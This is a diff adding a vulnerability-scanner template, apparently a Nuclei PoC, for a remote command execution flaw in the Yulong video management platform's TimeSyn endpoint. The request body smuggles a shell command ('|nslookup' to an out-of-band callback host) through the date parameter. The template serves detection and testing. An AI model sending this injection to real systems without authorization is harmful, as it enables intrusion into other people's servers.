@@ -1,0 +1,29 @@
+id: poc-yaml-yulongdt-timesyn-rce
+info:
+  name: 誉龙视音频综合管理平台 TimeSyn远程命令执行漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: dnslog,rce
+
+variables:
+  reverse: "{{interactsh-url}}"
+
+http:
+  - raw:
+      - |
+        POST /index.php?r=Third/TimeSyn HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        cloudKey=0x0&date=|nslookup {{reverse}}&time=1
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - dns
+      - type: word
+        part: interactsh_request
+        words:
+          - "nslookup"
